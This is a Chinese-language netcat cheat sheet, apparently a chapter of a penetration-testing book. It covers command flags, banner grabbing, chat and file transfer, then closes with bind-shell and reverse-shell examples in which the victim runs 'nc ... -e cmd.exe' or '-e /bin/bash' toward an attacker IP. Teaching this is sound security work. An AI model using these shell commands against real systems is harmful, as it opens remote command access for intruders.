# 第十四章：Netcat 备忘单

Netcat 是一款瑞士军刀工具，兼容 Linux 和 Windows。它既可以作为 TCP 客户端，也可以作为 UDP 客户端和服务器。

# Netcat 命令标志

+   `-l`: 监听模式（默认是客户端模式）。

+   `-L`: 更强的监听，仅在 Windows 版本的 Netcat 中支持。此选项使 Netcat 成为持久的监听器，在客户端断开连接后会重新开始监听。

+   `-u`: UDP 模式（默认是 TCP）。

+   `-p`: 本地端口（在监听模式下，这是监听的端口）。

+   `-e`: 连接建立后执行的程序。

+   `-n`: 不对另一端机器的名称进行 DNS 查找（名称解析）。

+   `-z`: 零 I/O 模式。

+   `-w(N)`: 连接超时时间。带有此选项的 Netcat 客户端或监听器将等待 *N* 秒以建立连接。例如，`w1` 或 `w2`。

+   `-v`: 详细模式。

+   `-vv`: 非常详细的输出。

# 实际例子

你在本书中已经学习了如何使用 Netcat。接下来的列表中，你将看到一些常见的实用例子：

+   **横幅抓取（HTTP）**：

```
nc -vn 10.1.1.100 80
```

按下 *Enter* 键执行命令后，输入任何内容，如 `Hello SERVER`，然后服务器会返回横幅头信息。

+   **简单聊天**：开始输入应该发送给对方的消息：

    +   设置并在一端监听：

```
nc -v -lp 1234
```

+   +   在另一端，连接到监听器：

```
nc -v [Remote IP] 1234
```

+   **传输文件**：

    +   在一端监听：

```
nc -vn -lp 1234 > file.txt
```

+   +   从另一端发送文件：

```
nc -vn <other side remote IP> 1234 < file.txt
```

+   **绑定 shell**：

    +   假设受害者是 Windows 机器，开始监听：

```
nc -lvp 1234 -e cmd.exe
```

+   +   从攻击者机器连接到受害主机：

```
nc -vn [Victim IP] 1234
```

+   **反向 shell 绕过防火墙**：

    +   开始在攻击者机器（Kali Linux）上监听：

```
nc -nlvp 1234
```

+   +   如果受害者使用的是 Windows 机器，输入以下命令：

```
nc -vn [Attacker IP] 1234 -e cmd.exe 
```

如果受害者使用的是 Linux 机器，则应使用 `-e /bin/bash`。
